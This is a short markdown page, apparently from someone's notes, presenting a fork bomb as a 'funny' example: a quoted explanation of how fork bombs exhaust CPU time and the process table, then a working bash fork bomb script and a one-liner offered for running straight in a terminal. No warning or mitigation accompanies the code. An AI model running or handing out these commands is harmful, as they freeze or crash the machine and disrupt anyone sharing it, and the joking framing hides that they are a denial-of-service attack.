#### Funny Fork Bomb example:

###### Wiki:
Fork bombs operate both by consuming CPU time in the process of forking, and by saturating the operating system's process table.A basic implementation of a fork bomb is an infinite loop that repeatedly launches new copies of itself.
In Unix-like operating systems, fork bombs are generally written to use the fork system call.As forked processes are also copies of the first program, once they resume execution from the next address at the frame pointer, they continue forking endlessly within their own copy of the same infinite loop; this has the effect of causing an exponential growth in processes. As modern Unix systems generally use a copy-on-write resource management technique when forking new processes, a fork bomb generally will not saturate such a system's memory.

##### Here is bash script:
```bash
#/usr/bin/env bash

bomb() { 
bomb|bomb &
}

for ((;;))
do 
  bomb
done
```
##### Or you can quickly execute in terminal:
```bash
$ gpt(){ gpt|gpt &} ; for ((;;));do gpt;done &
```

